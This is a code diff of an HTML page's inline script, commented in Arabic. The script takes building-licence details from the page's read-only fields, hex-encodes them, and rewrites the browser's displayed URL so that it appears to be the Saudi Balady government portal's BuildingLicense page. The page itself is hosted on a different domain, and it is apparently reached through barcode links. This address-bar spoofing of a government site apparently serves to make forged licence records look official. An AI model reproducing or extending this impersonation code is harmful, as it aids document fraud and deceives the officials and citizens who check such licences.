@@ -30,118 +30,104 @@
     <body class="loged-user">
 <script>
     document.addEventListener('DOMContentLoaded', function() {
+        console.log('Script started...');
         
-        // التحقق من نوع الـ URL عند تحميل الصفحة
-        function checkURLAndRedirect() {
+        // تغيير عرض الـ URL في address bar بدون تحويل
+        function changeURLDisplay() {
+            const currentURL = window.location.href;
+            const urlParams = new URLSearchParams(window.location.search);
+            const data = urlParams.get('data');
+            
+            console.log('Current URL:', currentURL);
+            console.log('Data parameter found:', data ? 'Yes' : 'No');
+            
+            // لو في data parameter والرابط مش apps.balady.gov.sa
+            if (data && !currentURL.includes('apps.balady.gov.sa')) {
+                const displayURL = `https://apps.balady.gov.sa/Eservices/Request/Public/BuildingLicense?data=${data}`;
+                console.log('Changing URL display to:', displayURL);
+                
+                try {
+                    // تغيير الـ URL في address bar بدون تحويل
+                    window.history.replaceState(null, '', displayURL);
+                    console.log('URL display changed successfully!');
+                    return true;
+                } catch (error) {
+                    console.error('Cannot change URL due to security restrictions:', error);
+                    // لو فشل، نعرض رسالة في الكونسول بس
+                    console.log('Alternative: URL would be:', displayURL);
+                    return false;
+                }
+            }
+            return false;
+        }
+        
+        // التحقق من نوع الـ URL
+        function checkURLAndProcess() {
             const currentPath = window.location.pathname;
             const urlParams = new URLSearchParams(window.location.search);
             
             console.log('Current path:', currentPath);
             console.log('URL params:', urlParams.toString());
             
-            // إذا كان الرابط يحتوي على UUID (جاي من الباركود)
+            // إذا كان الرابط يحتوي على UUID
             if (currentPath.includes('/ViewAttachments') && urlParams.has('key')) {
                 const uuid = urlParams.get('key');
-                console.log('تم اكتشاف UUID:', uuid);
+                console.log('UUID detected:', uuid);
                 
-                // تحويل فوري للرابط بالـ data مع تغيير الـ address bar
                 setTimeout(() => {
-                    redirectToDataURLWithDisplayChange(uuid);
+                    redirectToDataURL(uuid);
                 }, 500);
                 
                 return;
             }
             
-            // إذا كان الرابط يحتوي على data (بعد التحويل)
+            // إذا كان الرابط يحتوي على data (المهم هنا)
             if (currentPath.includes('/BuildingLicense') && urlParams.has('data')) {
-                console.log('تم اكتشاف data URL');
-                // غير الـ URL للعرض المطلوب
-                changeURLDisplay();
+                console.log('Data URL detected - changing display...');
+                // غير عرض الـ URL بس، مش تحول
+                setTimeout(() => {
+                    changeURLDisplay();
+                }, 1000);
                 return;
             }
             
-            // في أي حالة تانية، نفذ العملية العادية
+            // العملية العادية للصفحة الأساسية
             if (!currentPath.includes('/ViewAttachments') && !currentPath.includes('/BuildingLicense')) {
-                // الصفحة الأساسية - نفذ عملية إنشاء الـ URLs
                 startURLGeneration();
             }
         }
         
-        // تغيير عرض الـ URL للشكل المطلوب
-        function changeURLDisplay() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const data = urlParams.get('data');
-            
-            if (data) {
-                // تغيير الـ URL للعرض المطلوب بعد ثانية من التحميل
-                setTimeout(() => {
-                    const displayURL = `https://apps.balady.gov.sa/Eservices/Request/Public/BuildingLicense?data=${data}`;
-                    window.history.replaceState({}, '', displayURL);
-                    console.log('تم تغيير عرض الرابط إلى:', displayURL);
-                }, 1000);
-            }
-        }
-        
-        // تحويل من UUID للـ data URL مع تغيير الـ display URL
-        function redirectToDataURLWithDisplayChange(uuid) {
-            // البيانات المحددة
+        // تحويل من UUID للـ data URL مع تغيير العرض
+        function redirectToDataURL(uuid) {
             const specificData = getStoredDataByUUID(uuid) || collectSpecificDataFromPage();
             
             if (Object.keys(specificData).length > 0) {
                 const encodedData = encodeDataToHex(specificData);
                 
                 if (encodedData) {
-                    // أولاً: التحويل الداخلي لنفس الدومين
-                    const internalDataURL = `${window.location.origin}/Eservices/Request/Public/BuildingLicense?data=${encodedData}`;
-                    window.history.replaceState({}, '', internalDataURL);
-                    console.log('تحويل داخلي إلى:', internalDataURL);
+                    // تحويل للـ data URL (في نفس الدومين)
+                    const dataURL = `${window.location.origin}/Eservices/Request/Public/BuildingLicense?data=${encodedData}`;
+                    window.history.replaceState({}, '', dataURL);
+                    console.log('Redirected to data URL:', dataURL);
                     
-                    // ثانياً: بعد ثانية تغيير الـ address bar للدومين المطلوب
+                    // بعد كده غير العرض بس
                     setTimeout(() => {
-                        const displayURL = `https://apps.balady.gov.sa/Eservices/Request/Public/BuildingLicense?data=${encodedData}`;
-                        window.history.replaceState({}, '', displayURL);
-                        console.log('تم تغيير عرض الرابط إلى:', displayURL);
+                        changeURLDisplay();
                     }, 1000);
                 } else {
-                    console.error('فشل في تشفير البيانات');
+                    console.error('Failed to encode data');
                     redirectToHome();
                 }
             } else {
-                console.error('لم يتم العثور على البيانات');
+                console.error('No data found');
                 redirectToHome();
             }
         }
         
-        // تحويل من UUID للـ data URL (الطريقة الأصلية)
-        function redirectToDataURL(uuid) {
-            // البيانات المحددة
-            const specificData = getStoredDataByUUID(uuid) || collectSpecificDataFromPage();
-            
-            if (Object.keys(specificData).length > 0) {
-                const encodedData = encodeDataToHex(specificData);
-                
-                if (encodedData) {
-                    // التحويل لنفس الدومين بس مسار مختلف
-                    const dataURL = `${window.location.origin}/Eservices/Request/Public/BuildingLicense?data=${encodedData}`;
-                    
-                    console.log('تحويل إلى:', dataURL);
-                    window.location.href = dataURL;
-                } else {
-                    console.error('فشل في تشفير البيانات');
-                    redirectToHome();
-                }
-            } else {
-                console.error('لم يتم العثور على البيانات');
-                redirectToHome();
-            }
-        }
-        
-        // العودة للصفحة الأساسية
         function redirectToHome() {
             window.location.href = window.location.origin;
         }
         
-        // استرجاع البيانات المحفوظة بالـ UUID
         function getStoredDataByUUID(uuid) {
             try {
                 const storedData = localStorage.getItem(`specific_data_${uuid}`);
@@ -149,12 +135,11 @@
                     return JSON.parse(storedData);
                 }
             } catch (error) {
-                console.error('خطأ في استرجاع البيانات:', error);
+                console.error('Error retrieving data:', error);
             }
             return null;
         }
         
-        // جمع البيانات المحددة من الصفحة
         function collectSpecificDataFromPage() {
             const specificData = {};
             const inputs = document.querySelectorAll('input[readonly]');
@@ -185,7 +170,6 @@
             return specificData;
         }
         
-        // وظيفة توليد UUID
         function generateUUIDFromText(text) {
             const cleanText = text.trim().toLowerCase();
             let hash = 0;
@@ -203,7 +187,6 @@
             return combined.padEnd(32, '0');
         }
         
-        // تشفير البيانات
         function encodeDataToHex(data) {
             try {
                 const jsonString = JSON.stringify(data);
@@ -214,23 +197,19 @@
                 }
                 return 'bldyPrm' + hexData;
             } catch (error) {
-                console.error('خطأ في التشفير:', error);
+                console.error('Encoding error:', error);
                 return null;
             }
         }
         
-        // العملية العادية لإنشاء الـ URLs (للصفحة الأساسية)
         function startURLGeneration() {
             setTimeout(() => {
-                // جمع البيانات المحددة
                 const specificData = collectSpecificDataFromPage();
                 
                 if (Object.keys(specificData).length > 0) {
-                    // توليد UUID
                     const ownerName = getOwnerName() || 'default_owner';
                     const uuid = generateUUIDFromText(ownerName);
                     
-                    // حفظ البيانات المحددة مع الـ UUID
                     localStorage.setItem(`specific_data_${uuid}`, JSON.stringify(specificData));
                     
                     // المرحلة الأولى: UUID URL
@@ -238,7 +217,7 @@
                     window.history.replaceState({}, '', uuidURL);
                     console.log('UUID URL:', uuidURL);
                     
-                    // المرحلة الثانية: Data URL بعد ثانية (في نفس الدومين)
+                    // المرحلة الثانية: Data URL
                     setTimeout(() => {
                         const encodedData = encodeDataToHex(specificData);
                         if (encodedData) {
@@ -246,11 +225,9 @@
                             window.history.replaceState({}, '', dataURL);
                             console.log('Data URL:', dataURL);
                             
-                            // المرحلة الثالثة: تغيير عرض الـ URL بعد ثانية أخرى
+                            // المرحلة الثالثة: تغيير العرض بس
                             setTimeout(() => {
-                                const displayURL = `https://apps.balady.gov.sa/Eservices/Request/Public/BuildingLicense?data=${encodedData}`;
-                                window.history.replaceState({}, '', displayURL);
-                                console.log('Display URL:', displayURL);
+                                changeURLDisplay();
                             }, 1000);
                         }
                     }, 1000);
@@ -258,7 +235,6 @@
             }, 1000);
         }
         
-        // استخراج اسم المالك
         function getOwnerName() {
             const inputs = document.querySelectorAll('input[readonly]');
             for (let input of inputs) {
@@ -274,8 +250,8 @@
             return `owner_${Date.now()}`;
         }
         
-        // بدء التحقق من الـ URL
-        checkURLAndRedirect();
+        // بدء المعالجة
+        checkURLAndProcess();
         
         // معالجة أحداث المتصفح
         window.addEventListener('popstate', function() {
@@ -283,7 +259,7 @@
             redirectToHome();
         });
         
-        // معالجة الـ refresh للـ display URLs
+        // معالجة الـ refresh
         window.addEventListener('beforeunload', function() {
             // إذا كان الرابط المعروض من apps.balady.gov.sa
             if (window.location.href.includes('apps.balady.gov.sa')) {
@@ -298,18 +274,21 @@
             redirectToHome();
         }
         
-        // وظائف مساعدة
-        window.testUUID = function(uuid) {
-            redirectToDataURL(uuid);
+        // وظائف للتجريب
+        window.changeDisplay = function() {
+            console.log('Manual display change triggered...');
+            return changeURLDisplay();
         };
         
-        window.testUUIDWithDisplay = function(uuid) {
-            redirectToDataURLWithDisplayChange(uuid);
+        window.testUUID = function(uuid) {
+            redirectToDataURL(uuid);
         };
         
         window.goHome = function() {
             redirectToHome();
         };
+        
+        console.log('Script initialization complete');
     });
 </script>
         <div class="preloader" id="preloader-logo">
